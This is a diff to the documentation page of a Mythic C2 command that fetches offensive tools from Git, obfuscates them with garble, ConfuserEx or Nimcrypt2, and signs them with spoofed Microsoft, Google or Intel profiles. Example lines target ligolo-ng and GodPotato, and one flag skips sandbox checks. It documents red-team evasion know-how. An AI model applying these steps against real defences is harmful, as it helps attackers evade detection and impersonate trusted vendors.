@@ -1,15 +1,15 @@
 +++
-title = "obfuscate_build"
+title = "daedalus_obfuscate_build"
 chapter = false
 weight = 102
 hidden = false
 +++
 
 ## Summary
-Pull source from any Git repository (GitHub, Forgejo, GitLab, etc.), trigger a CI/CD obfuscation pipeline (garble, ConfuserEx, etc.) on any supported provider, then execute in-memory or register as a tool.
+Pull source from any Git repository (GitHub, Forgejo, GitLab, etc.), trigger the CI/CD tooling pipeline (garble, ConfuserEx, Nimcrypt2, Limelighter signing) on any supported provider, then execute in-memory or register as a tool. Uses the `tooling-{language}` pipeline by default, separate from the loader pipelines.
 
 - Needs Admin: False
-- Version: 2
+- Version: 4
 - Author: @Lavender-exe
 
 ### Arguments
@@ -35,7 +35,7 @@ Pull source from any Git repository (GitHub, Forgejo, GitLab, etc.), trigger a C
 
 #### job
 
-- Description: CI job/workflow name for the obfuscation pipeline. Auto-resolved as `loader-{language}` when empty
+- Description: CI job/workflow name for the obfuscation pipeline. Auto-resolved as `tooling-{language}` when empty
 - Required Value: False
 - Default Value: None
 
@@ -58,7 +58,20 @@ Pull source from any Git repository (GitHub, Forgejo, GitLab, etc.), trigger a C
 - Description: Obfuscation level to apply (garble for Go, ConfuserEx for .NET, etc.)
 - Required Value: False
 - Default Value: full
-- Choices: none, basic, full, garble
+- Choices: none, basic, full, garble, nimcrypt2
+
+#### nimcrypt2_flags
+
+- Description: Extra Nimcrypt2 flags (e.g. `-l` for OLLVM stub, `-s` to skip sandbox checks)
+- Required Value: False
+- Default Value: None
+
+#### signing_profile
+
+- Description: Code signing profile (Limelighter)
+- Required Value: False
+- Default Value: none
+- Choices: none, microsoft, google, intel, custom
 
 #### source_path
 
@@ -98,8 +111,10 @@ Each provider has optional credential overrides. These override Mythic Secrets a
 ## Usage
 
 ```
-obfuscate_build -repo_url https://github.com/nicocha30/ligolo-ng -provider jenkins -job obfuscate-go -language go -obfuscation garble -source_path cmd/agent -tool_type register_only
-obfuscate_build -repo_url https://github.com/example/tool -provider github -language csharp -obfuscation full -tool_type assembly
+daedalus_obfuscate_build -repo_url https://github.com/nicocha30/ligolo-ng -language go -obfuscation garble -source_path cmd/agent
+daedalus_obfuscate_build -repo_url https://github.com/example/tool -provider github -language csharp -obfuscation full -tool_type assembly
+daedalus_obfuscate_build -repo_url https://github.com/BeichenDream/GodPotato -language csharp -obfuscation nimcrypt2 -signing_profile microsoft
+daedalus_obfuscate_build -repo_url https://github.com/example/loader -language csharp -obfuscation full -signing_profile google -nimcrypt2_flags "-l -s"
 ```
 
 ## MITRE ATT&CK Mapping
@@ -125,6 +140,8 @@ The command passes these as CI build parameters:
 | `REPO_TOKEN` | `repo_token` argument (resolved via Mythic Secrets) |
 | `SOURCE_PATH` | `source_path` argument |
 | `REF` | `ref` argument |
+| `NIMCRYPT2_FLAGS` | `nimcrypt2_flags` argument (only when set) |
+| `SIGNING_PROFILE` | `signing_profile` argument (only when not `none`) |
 
 ### Pipeline Phases
 
